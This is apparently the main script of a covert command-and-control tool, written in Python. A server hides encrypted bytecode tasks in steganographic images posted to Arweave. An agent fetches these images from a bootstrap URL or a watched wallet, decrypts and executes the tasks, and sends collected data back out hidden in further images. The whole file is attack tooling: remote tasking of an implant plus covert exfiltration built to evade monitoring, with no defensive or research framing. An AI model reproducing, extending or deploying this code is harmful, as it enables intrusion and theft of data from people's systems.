import logging
import os
import argparse
import requests

from PIL import Image
from io import BytesIO

#Configure logging before importing project modules
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("forensic.log"),
        logging.StreamHandler(),
    ]
)
logger = logging.getLogger(__name__)

#Imports
from src.keys import (
    server_load_server_keys, server_derive_allkeys, server_save_server_keys,
    agent_load_agent_keys, agent_save_agent_keys,
    advance_ratchet, load_wallet
)

from src.assembler import OPCODE_TABLE, assemble_payload
from src.crypto_wrapper import encrypt_task, decrypt_task
from src.stego import embed, extract
from src.vm import execute_bytecode
from src.arweave_interface import MockArweave, download_image, get_wallet_transactions, get_latest_image_txid

#Creates the CLI using argparse
parser = argparse.ArgumentParser(prog="MAIN", description="Covert tasking channel orchestrator")
subparser = parser.add_subparsers(dest="Command")

#Server subcommand
server_parser = subparser.add_parser(name="server", description="Server commands", prog="MAIN")

server_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
server_parser.add_argument("--task", required=True, help="Space separated assembly")
server_parser.add_argument("--cover", required=True, help="Path to the cover image")
server_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")

#Agent subcommand
agent_parser = subparser.add_parser(name="agent", description="Agent commands", prog="MAIN")

agent_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
agent_parser.add_argument("--wallet", required=True, help="Path to arweave wallet file")
agent_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")

agent_group = agent_parser.add_mutually_exclusive_group(required=True)

agent_group.add_argument("--bootstrap-url", help="Bootstrap task fetch URL")
agent_group.add_argument("--watch", action="store_true", help="Poll server wallet for replies")

shared_state = {}

def run_server(args):
    #Load server keys from keyfile
    K_root = server_load_server_keys(args.keyfile)
    server_keys = server_derive_allkeys(K_root)

    K_ratchet = server_keys["K_ratchet"]
    K_extract = server_keys["K_extract"]

    #Splits args.task into valid bytecode instructions
    task_string = args.task
    task_tokens = task_string.split()

    lines = []
    current_instruction = []
    for token in task_tokens:

        if token in OPCODE_TABLE:
            if current_instruction:
                lines.append(" ".join(current_instruction))
            current_instruction = [token]
        else:
            current_instruction.append(token)

    if current_instruction:
        lines.append(" ".join(current_instruction))

    #Assembles the payload
    logger.info("Step A, Payload assembly start")
    bytecode = assemble_payload(lines)
    bytecode_length = len(bytecode)
    logger.info(f"Step A, bytecode length is {bytecode_length}")

    #Encrypts the task
    payload, new_ratchet = encrypt_task(bytecode, K_ratchet)
    payload_length = len(payload)
    logger.info(f"Step A, Payload length is {payload_length}")
    logger.info("Step A, Payload assembly finished")

    #Embeds the payload
    logger.info("Step B, Payload embedding start")
    stego_image = embed(args.cover, payload, K_extract)

    stego_dir = "src/temp"
    os.makedirs(stego_dir, exist_ok=True)
    stego_path = os.path.join(stego_dir, "stego.png")
    stego_image.save(stego_path)

    logger.info(f"Step B, Embedded image saved to {stego_path}")
    logger.info("Step B, Payload embedding finished")

    #Uploads the stego image
    logger.info("Step C, Image upload start")
    if args.mock:
        mock = MockArweave()
        txid = mock.upload_image("server_wallet", stego_path)
        logger.info(f"Step C, Image uploaded in transaction_id {txid}")
        logger.info("Step C, Image upload finished")
    else:
        raise NotImplementedError("Real Arweave upload not configured")

    #Stores shared state for the agent
    shared_state["txid"] = txid
    shared_state["new_ratchet"] = new_ratchet
    shared_state["mock"] = mock
    shared_state["K_extract"] = K_extract
    shared_state["K_ratchet"] = K_ratchet

    return 1

def run_agent(args):
    #Load agent keys from keyfile
    agent_keys = agent_load_agent_keys(args.keyfile)

    K_ratchet = agent_keys["K_ratchet"]
    K_exfil_ratchet = agent_keys["K_exfil_ratchet"]
    K_extract = agent_keys["K_extract"]
    server_wallet = agent_keys["server_wallet"]
    last_seen_txid = agent_keys["last_seen_txid"]
    cover_path = agent_keys["cover_path"]

    #Load persisted cover into shared state so the exfil handler can reuse it
    shared_state["cover_path"] = cover_path if cover_path else None

    #Exfiltration handler closure with access to agent keys and state
    def exfil_handler(vm, data):
        # advance for next exfil in same VM run
        nonlocal K_exfil_ratchet  

        #Check for a saved cover image
        logger.info("Exfil handler start")

        logger.info("Exfil handler step A, cover image checking start")
        cover_path = shared_state.get("cover_path")

        if cover_path is None:
            logger.info("Exfil handler step A, cover image checking failed")
            return -1
        else:
            logger.info("Exfil handler step A, cover image checking succeeded")
            logger.info("Exfil handler step A, cover image checking finished")
        
        #Encrypt the exfil data
        logger.info("Exfil handler step B, exfil data encryption start")
        exfil_payload, new_exfil_ratchet = encrypt_task(data, K_exfil_ratchet)

        #advance for next exfil in same VM run
        K_exfil_ratchet = new_exfil_ratchet 

        logger.info("Exfil handler step B, exfil data encryption finished")

        #embed the encrypted payload into the cover image
        logger.info("Exfil handler step B, exfil data embedding start")
        stego_image = embed(cover_path, exfil_payload, K_extract)

        stego_dir = "src/temp"
        os.makedirs(stego_dir, exist_ok=True)
        exfil_stego_path = os.path.join(stego_dir, "exfil.png")
        stego_image.save(exfil_stego_path)

        logger.info(f"Exfil handler step B, exfil image saved to {exfil_stego_path}")
        logger.info("Exfil handler step B, exfil data embedding finished")

        #Upload exfil data via arweave
        logger.info("Exfil handler step C, exfil data uploading start")
        txid = shared_state["mock"].upload_image("agent_wallet", exfil_stego_path)
        logger.info("Exfil handler step C, exfil data uploading finished")

        #Update shared state
        shared_state["new_exfil_ratchet"] = new_exfil_ratchet
        return txid
    
    #Acquire the reply image: bootstrap fetch or wallet watch
    logger.info("Step A, Image acquisition start")

    if args.bootstrap_url is not None:
        #Bootstrap fetch from centralized platform URL
        logger.info("Step A, Bootstrap image download start")
        if args.mock:
            image_bytes = shared_state["mock"].download_image(shared_state["txid"])
            logger.info("Step A, Bootstrap image download Finished")
        else:
            image_bytes = requests.get(args.bootstrap_url, timeout=30).content
            logger.info("Step A, Bootstrap image download Finished")
    else:
        #Watch mode: poll server wallet tx history for replies
        logger.info("Step A, Watch wallet poll start")

        if not server_wallet:
            logger.info("Step A, No server wallet configured in keyfile")
            return -1

        if args.mock:
            mock = shared_state.get("mock")
            if mock is None:
                logger.info("Step A, Mock instance not available, no replies")
                return 0
            txids = mock.get_wallet_transactions(server_wallet)
        else:
            txids = get_wallet_transactions(server_wallet)

        #Filter out txids up to and including last_seen_txid
        if last_seen_txid and last_seen_txid in txids:
            idx = txids.index(last_seen_txid)
            new_txids = txids[idx + 1:]
        else:
            new_txids = txids

        if not new_txids:
            logger.info("Step A, No new replies found")
            return 0

        #Process oldest new reply in chronological order (single-shot)
        reply_txid = new_txids[0]
        logger.info(f"Step A, Found reply txid {reply_txid}")

        if args.mock:
            image_bytes = shared_state["mock"].download_image(reply_txid)
        else:
            image_bytes = download_image(reply_txid)

        last_seen_txid = reply_txid
        logger.info("Step A, Watch image download Finished")

    logger.info("Step A, Image acquisition finished")

    #Save downloaded bytes to a temp file
    logger.info("Step B, Bootstrap image stego extraction start")

    stego_stream = BytesIO(image_bytes)
    stego_image = Image.open(stego_stream)

    stego_dir = "src/temp"
    os.makedirs(stego_dir, exist_ok=True)
    stego_path = os.path.join(stego_dir, "stego.png")
    stego_image.save(stego_path)

    logger.info(f"Step B, Bootstrap image saved to {stego_path}")

    #Extract the payload from the bootstrap image
    payload = extract(stego_path, K_extract)
    logger.info("Step B, Bootstrap image payload extracted")
    logger.info(f"Step B, Payload length {len(payload)}")
    logger.info("Step B, Bootstrap image stego extraction finished")

    #Decrypt the payload
    logger.info("Step C, Payload decryption start")
    payload_result = decrypt_task(payload, K_ratchet)

    if payload_result is None:
        logger.info("Step C, Payload decryption failed")
        logger.info("Step C, Payload decryption finished")
        return -1
    
    bytecode, agent_new_ratchet = payload_result
    logger.info("Step C, Payload decryption successful")
    logger.info("Step C, Payload decryption finished")

    #Execute the bytecode 
    logger.info("Step D, Bytecode execution start")
    vm_result = execute_bytecode(bytecode, exfil_handler=exfil_handler)
    logger.info(f"Step D, Bytecode execution vm result is {vm_result}")
    logger.info("Step D, Bytecode execution finished")

    #Advance and persist ratchet
    logger.info("Step E, Advance and persist ratchet start")
    agent_save_agent_keys(args.keyfile, agent_new_ratchet, K_exfil_ratchet, K_extract,
                          last_seen_txid=last_seen_txid, cover_path=stego_path)
    logger.info("Step E, Advance and persist ratchet Finished")

    #Save received image for reuse as next exfil cover
    logger.info("Save received image for reuse as next exfil cover start")
    shared_state["cover_path"] = stego_path
    logger.info("Save received image for reuse as next exfil cover finished")

    return 1
 
#Parses args and dispatches
if __name__ == "__main__":
    args = parser.parse_args()

    if args.Command == "server":
        run_server(args)
    elif args.Command == "agent":
        run_agent(args)
    else:
        parser.print_help()
